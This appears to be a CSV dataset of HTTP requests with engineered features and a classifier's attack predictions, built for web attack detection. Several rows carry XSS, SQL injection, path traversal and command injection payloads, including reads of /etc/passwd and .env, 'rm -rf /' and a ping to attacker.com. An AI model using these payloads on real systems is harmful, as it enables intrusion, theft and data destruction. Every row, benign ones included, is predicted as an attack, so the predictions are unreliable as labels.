Method,URL,content,content-type,Cookie,Length,User-Agent,classification,url_length,path_depth,query_length,param_count,content_length,content_numbers,content_special_chars,has_hex_encoding,has_base64,contains_special_chars,contains_sql_injection,contains_xss,contains_command_injection,Accept,cookie,predicted_class,attack_probability
0,/api/v1/resources/1,,1,807,150,3,0,19,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/users/profile/CFEJazDd,,2,299,68,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/index.html,,2,2259,145,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/api/v1/resources/26,param1=Pcq57WuK&param2=RjhDL,2,1015,50,3,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
0,/products/88,,1,851,35,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
0,/page?id=<script>alert('XSS')</script>,comment=<svg onload='alert(1)'>,0,54,289,0,1,38,2,32,1,31,1,8,0,0,1,0,1,0,0,,1,0.9999505
2,/search?q=1' OR '1'='1,username=1; SELECT * FROM information_schema.tables,0,274,663,2,1,22,1,14,1,51,1,5,0,0,1,1,0,1,0,,1,0.9999678
1,/products/52,,2,491,132,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
3,/index.html,,1,183,69,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/api/v1/resources/14,param1=KER0kc5H&param2=YcLtE,2,1342,253,3,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
2,/download?file=../../.env,,0,885,1642,2,1,25,3,15,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
2,/page?id=<script>alert('XSS')</script>,comment=<svg onload='alert(1)'>,1,2011,720,2,1,38,2,32,1,31,1,8,0,0,1,0,1,0,0,,1,0.9999505
0,/search?q=1; SELECT * FROM information_schema.tables,username=1; SELECT * FROM information_schema.tables,0,1819,758,2,1,52,1,44,1,51,1,5,0,0,1,1,0,1,0,,1,0.9999678
1,/api/v1/resources/23,,0,170,186,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/page?id=<img src='x' onerror='alert(1)'>,comment=<img src='x' onerror='alert(1)'>,0,1121,1498,6,1,41,1,35,1,40,1,11,0,0,1,0,1,0,0,,1,0.99995255
2,/index.html,,2,164,47,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/users/profile/9FvOrTBo,param1=6XAeI5ED&param2=AYomv,1,18,410,3,0,23,3,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
3,/users/profile/Kmou9DGZ,param1=QAza5mYp&param2=eRkCi,1,750,470,4,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
2,/index.html,param1=WXgpIqMX&param2=9unqM,1,1852,435,4,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
3,/search?q=8afEA,,2,378,206,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/index.html,,1,894,282,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/search?q=UcFIM,,1,2231,120,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/api/v1/resources/31,,0,2061,387,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/products/52,param1=fka7rlKi&param2=a9ZX4,2,2050,74,3,0,12,2,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999521
3,/products/63,param1=8BVdeFEN&param2=vvC1O,2,2207,166,1,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
3,/search?q=oVXpF,,0,900,277,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
1,/products/78,,1,1395,320,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/search?q=NDv0X,,2,341,58,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/page?id=<img src='x' onerror='alert(1)'>,comment=<svg onload='alert(1)'>,0,2411,1609,2,1,41,1,35,1,31,1,8,0,0,1,0,1,0,0,,1,0.99995255
1,/index.html,,0,1477,104,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/search?q=bZYqJ,,2,1371,102,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/execute?cmd=ping | cat /etc/passwd,command=ls & net user,0,1375,537,2,1,35,3,26,1,21,0,2,0,0,0,0,0,1,0,,1,0.999956
0,/execute?cmd=ping `ping -c 4 attacker.com`,command=ls | cat /etc/passwd,1,549,1322,6,1,42,1,33,1,28,0,4,0,0,0,0,0,1,0,,1,0.9999573
3,/search?q=B5Pwz,param1=qrfGyMcf&param2=rVTt0,1,1245,202,3,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
3,/products/76,param1=UJtj4Pzf&param2=GFIxT,2,2449,112,4,0,12,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
0,/api/v1/resources/15,param1=SWJRg97b&param2=07uJJ,2,665,356,4,0,20,4,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
0,/download?file=../../../etc/passwd,,1,643,1165,7,1,34,5,24,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/users/profile/NnrTNLvX,,0,2343,146,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/users/profile/AyDmiJ1v,,0,258,253,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/products/58,param1=PCm5TmVf&param2=xwt6O,1,2082,488,1,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
2,"/page?id='""><script>alert(1)</script>",comment=<img src='x' onerror='alert(1)'>,0,2081,476,7,1,37,2,31,1,40,1,11,0,0,1,0,1,0,0,,1,0.9999505
3,/search?q=oN0Mf,param1=IU9cxAeL&param2=xvTPQ,2,1616,218,3,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
3,/api/v1/resources/48,,0,1274,455,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/execute?cmd=ping | cat /etc/passwd,command=ls & net user,0,673,779,5,1,35,3,26,1,21,0,2,0,0,0,0,0,1,0,,1,0.999956
2,/products/56,param1=GN4NPZbM&param2=ijr1M,0,2346,128,3,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
2,/index.html,,0,194,481,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/products/84,param1=WxdyCXC8&param2=IDJeO,0,591,181,1,0,12,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
1,/users/profile/CPbCtwmz,param1=mA3kudAs&param2=xqZcM,0,1947,333,3,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/users/profile/0TObPv19,param1=4SGOtJqW&param2=StsRQ,2,2164,219,4,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/execute?cmd=ping | cat /etc/passwd,command=ls | cat /etc/passwd,1,2056,1159,7,1,35,3,26,1,28,0,4,0,0,0,0,0,1,0,,1,0.999956
3,/index.html,,0,721,192,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/search?q=admin' --,"username=' UNION SELECT username, password FROM users --",1,1834,1233,0,1,19,1,11,1,56,0,5,0,0,1,1,0,0,0,,1,0.9999356
0,/search?q=1' OR '1'='1,username='; DROP TABLE users; --,1,384,1291,0,1,22,1,14,1,32,0,6,0,0,1,1,0,1,0,,1,0.99996305
0,/search?q=hNTbK,,1,337,211,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
1,/api/v1/resources/47,param1=gk6Fbue8&param2=6yHsa,2,1723,441,3,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
0,/products/95,,1,1980,373,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/products/4,param1=VBWtOHQ2&param2=QBkXL,2,439,211,1,0,11,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
2,/api/v1/resources/37,param1=V6N5cawA&param2=LmcV6,0,535,444,3,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
1,/products/46,param1=jgaymbgK&param2=QGqKC,1,1103,105,4,0,12,2,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999521
2,/execute?cmd=ping || whoami,command=ls || whoami,0,63,1254,6,1,27,1,18,1,20,0,3,0,0,0,0,0,1,0,,1,0.9999573
1,/search?q=HwKnt,param1=He3YeblC&param2=sfyss,0,2396,477,1,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
2,/api/v1/resources/13,,1,2359,98,1,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/index.html,,1,1261,112,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/execute?cmd=ping `ping -c 4 attacker.com`,command=ls ; rm -rf /,0,1314,402,5,1,42,1,33,1,21,0,4,0,0,1,0,0,1,0,,1,0.9999573
0,/search?q=admin' --,username='; DROP TABLE users; --,0,1691,955,7,1,19,1,11,1,32,0,6,0,0,1,1,0,1,0,,1,0.99994636
2,/products/33,,2,268,225,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/users/profile/VGqeuxh7,param1=tY6UhG39&param2=PEiDa,2,1005,324,4,0,23,3,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
0,/execute?cmd=ping & net user,command=ls `ping -c 4 attacker.com`,0,413,1757,7,1,28,1,19,2,35,1,5,0,0,0,0,0,1,0,,1,0.9999511
0,/index.html,param1=ltVKPYnF&param2=1AiJB,0,2171,386,3,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
0,/api/v1/resources/39,,1,2304,445,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/search?q=nQSl1,param1=9kiLV4ZP&param2=4Xtlv,0,1199,70,4,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
2,/page?id=<img src='x' onerror='alert(1)'>,comment=<img src='x' onerror='alert(1)'>,0,443,177,7,1,41,1,35,1,40,1,11,0,0,1,0,1,0,0,,1,0.99995255
3,/products/73,param1=HizFCvdY&param2=YZJtj,0,1207,118,4,0,12,2,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999521
2,/search?q=wBWUD,param1=5iZZiWo2&param2=Xxp9v,1,821,349,1,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
0,/page?id=<img src='x' onerror='alert(1)'>,"comment='""><script>alert(1)</script>",1,451,1634,5,1,41,1,35,1,36,1,11,0,0,1,0,1,0,0,,1,0.99995255
2,/api/v1/resources/20,param1=egXb6TnN&param2=DwyGX,0,326,167,1,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
2,/download?file=file:///etc/passwd,,0,1211,1546,6,1,33,5,23,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/search?q=RDnk1,param1=1V5J4hOw&param2=UjeFg,2,1569,130,1,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
2,/products/87,param1=zvyv9w12&param2=VCU80,2,2000,51,3,0,12,2,0,0,28,7,3,0,0,0,0,0,1,0,,1,0.9999521
3,/users/profile/5AU2Iy7W,param1=G1KyDPiU&param2=ytMEY,2,0,264,1,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/api/v1/resources/14,param1=7X5QZ0dD&param2=6dulV,1,1068,283,3,0,20,4,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
2,/page?id=<img src='x' onerror='alert(1)'>,comment=<script>alert('XSS')</script>,0,2085,197,0,1,41,1,35,1,37,0,10,0,0,1,0,1,0,0,,1,0.9999497
0,/api/v1/resources/15,,1,1482,58,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/search?q=2YIaD,param1=e93iU80w&param2=9ie4z,1,1620,352,4,0,15,1,7,1,28,8,3,0,0,0,0,0,1,0,,1,0.99993706
0,/search?q=zQTVn,param1=F9KPZyF3&param2=XXl28,0,380,196,3,0,15,1,7,1,28,6,3,0,0,0,0,0,1,0,,1,0.99993706
1,/users/profile/CyyO478i,,2,1608,434,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/products/75,,2,1130,459,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/execute?cmd=ping & net user,command=ls ; rm -rf /,0,2018,1366,7,1,28,1,19,2,21,0,4,0,0,1,0,0,1,0,,1,0.99994016
1,/api/v1/resources/11,,0,1243,21,1,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/users/profile/kGiSs2az,param1=5Y6qtUsu&param2=56Sv6,1,2112,208,4,0,23,3,0,0,28,7,3,0,0,0,0,0,1,0,,1,0.99993515
2,/products/25,param1=hYiA0Ez2&param2=9jeHA,1,1283,347,3,0,12,2,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999521
3,/api/v1/resources/29,,2,850,284,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/users/profile/6S0os6DL,,2,1047,452,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/api/v1/resources/27,,1,2214,149,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/api/v1/resources/45,,1,1081,294,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/api/v1/resources/34,param1=j81rCX48&param2=fgz9k,2,939,184,1,0,20,4,0,0,28,7,3,0,0,0,0,0,1,0,,1,0.99993515
3,/users/profile/nZic0lvP,param1=YCktU5Ga&param2=eBM8T,0,2306,474,4,0,23,3,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
3,/search?q=tSqeo,param1=x1NOLhwA&param2=bU1lj,0,1474,410,3,0,15,1,7,1,28,4,3,0,0,0,0,0,1,0,,1,0.99993706
2,/execute?cmd=ping || whoami,command=ls || whoami,1,1392,1673,0,1,27,1,18,1,20,0,3,0,0,0,0,0,1,0,,1,0.9999573
0,/search?q=Kha5Z,param1=Bh4hdALx&param2=kKXcE,1,1941,11,1,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
0,/index.html,param1=66TnOmiX&param2=fa3HY,2,460,373,1,0,11,1,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999485
0,/users/profile/UduVviy8,,0,176,69,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/users/profile/x1Jc1L70,param1=bgY0I2lJ&param2=qs5XV,0,1369,271,3,0,23,3,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
2,/index.html,param1=9TdKwEIs&param2=vbeYF,2,2218,301,1,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
3,/search?q=Jw8Mr,,1,1975,433,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
3,/index.html,param1=XwLCyyWh&param2=D0iFI,1,148,411,3,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
2,/index.html,param1=cKtTvEpq&param2=MaymC,2,710,352,1,0,11,1,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999485
2,/products/88,param1=DStBY77X&param2=ozTR1,1,1334,458,3,0,12,2,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999521
0,/users/profile/VIcDEBqr,param1=Y5ovJaaw&param2=lnNOI,2,162,164,3,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
1,/users/profile/dPlfGqYo,param1=qCjlVMN8&param2=ZJsIL,0,948,42,3,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
3,/index.html,,2,2330,264,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
1,/api/v1/resources/25,param1=gp1hV14U&param2=r8tGQ,1,968,161,3,0,20,4,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
1,/products/5,param1=msAWmSX6&param2=Fc5DU,2,2133,155,4,0,11,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
1,/search?q=r8fEE,param1=Tv1FxGMq&param2=3NRNf,0,1850,434,1,0,15,1,7,1,28,4,3,0,0,0,0,0,1,0,,1,0.99993706
0,/index.html,param1=uzcHugRc&param2=mPfQB,2,2318,68,3,0,11,1,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999485
1,/api/v1/resources/44,,0,2028,304,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/search?q=fxW4B,param1=rQziNnMy&param2=OuKeL,2,1730,167,1,0,15,1,7,1,28,2,3,0,0,0,0,0,1,0,,1,0.99993706
0,/page?id=<script>alert('XSS')</script>,comment=<img src='x' onerror='alert(1)'>,1,2089,1855,6,1,38,2,32,1,40,1,11,0,0,1,0,1,0,0,,1,0.9999505
3,/search?q=jAz9l,,0,904,218,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/index.html,,2,864,264,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/download?file=../../.env,,1,2382,1864,5,1,25,3,15,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/index.html,,0,908,53,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/search?q=eI9tI,,2,1937,298,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/api/v1/resources/46,,2,2491,15,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/search?q=1; SELECT * FROM information_schema.tables,username='; DROP TABLE users; --,1,1927,1892,7,1,52,1,44,1,32,0,6,0,0,1,1,0,1,0,,1,0.99996305
1,/search?q=ltP3W,,1,463,12,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/products/92,,2,1306,393,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/users/profile/lWyFcYuE,,0,2098,146,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/search?q=nxLio,,1,408,104,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
1,/users/profile/obOMpint,,1,799,290,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/search?q=A5V6H,,1,560,122,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
1,/api/v1/resources/27,param1=xCFxPtGO&param2=HzR92,0,2468,464,1,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
3,/api/v1/resources/33,param1=PkBRs1bT&param2=9CwwB,1,2356,43,1,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
3,/index.html,,1,204,443,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
1,/api/v1/resources/42,,2,1071,213,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/search?q=1' OR '1'='1,"username=' UNION SELECT username, password FROM users --",0,1349,1570,5,1,22,1,14,1,56,0,5,0,0,1,1,0,0,0,,1,0.99995565
3,/products/58,param1=HRDHLSvH&param2=xPUP6,1,1299,323,3,0,12,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
0,/index.html,param1=4Bm8HWh9&param2=03mBM,1,146,138,3,0,11,1,0,0,28,7,3,0,0,0,0,0,1,0,,1,0.9999485
3,/index.html,,1,2312,432,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/api/v1/resources/3,param1=zfE3sRfX&param2=AJUY3,2,2167,253,3,0,19,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
0,/index.html,param1=KTm0W3kU&param2=nUeEF,2,2014,376,4,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
0,/page?id=<img src='x' onerror='alert(1)'>,comment=<svg onload='alert(1)'>,1,247,196,0,1,41,1,35,1,31,1,8,0,0,1,0,1,0,0,,1,0.99995255
0,/index.html,param1=4HpHNsvq&param2=N3IbP,1,362,299,3,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
2,/users/profile/OED06YwH,param1=kCaQPNOD&param2=B4jmE,2,340,282,3,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
1,/products/1,param1=IPYcC3nV&param2=S4iR7,2,253,54,1,0,11,2,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999521
1,/products/72,param1=wfIgDs1I&param2=9PbNb,1,1178,136,3,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
3,/index.html,,2,991,391,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/api/v1/resources/49,,1,1628,343,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/download?file=file:///etc/passwd,,0,416,1531,0,1,33,5,23,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
3,/products/74,,1,239,106,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
3,/products/76,,1,608,151,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
1,/index.html,param1=qeTRUmj4&param2=gvlGp,1,973,415,1,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
1,/index.html,,0,2410,171,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/index.html,param1=bgVPRbMM&param2=ybh2E,2,1340,83,1,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
3,/products/78,,0,1617,482,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
1,/users/profile/6DHSJ3eC,,1,1573,357,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/products/61,param1=nRA9lvle&param2=IMbdi,0,20,443,1,0,12,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
0,/download?file=../../.env,,1,2117,1280,2,1,25,3,15,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
3,/users/profile/RkaEwK35,,0,1587,50,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/search?q=hgc0w,,2,23,195,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
1,/users/profile/nhJIwQ7k,,1,105,54,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/api/v1/resources/10,,2,189,366,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/index.html,,1,484,73,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
1,/users/profile/SBoOGD1c,,2,585,273,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/users/profile/x3ZcB9P2,param1=l1dUEMd0&param2=dm9qP,2,2120,30,4,0,23,3,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
0,/search?q=gKTuB,,2,845,225,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
3,/users/profile/Cdl09kn9,param1=ZeTWMvpB&param2=UTKhC,0,325,44,1,0,23,3,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.99993515
0,/api/v1/resources/10,,0,410,291,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/index.html,,2,1089,85,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/users/profile/76834Lwb,param1=W0lHyfYr&param2=Mkiid,2,51,104,3,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
2,/index.html,param1=gaYko1EM&param2=R4M2x,2,1341,70,4,0,11,1,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999485
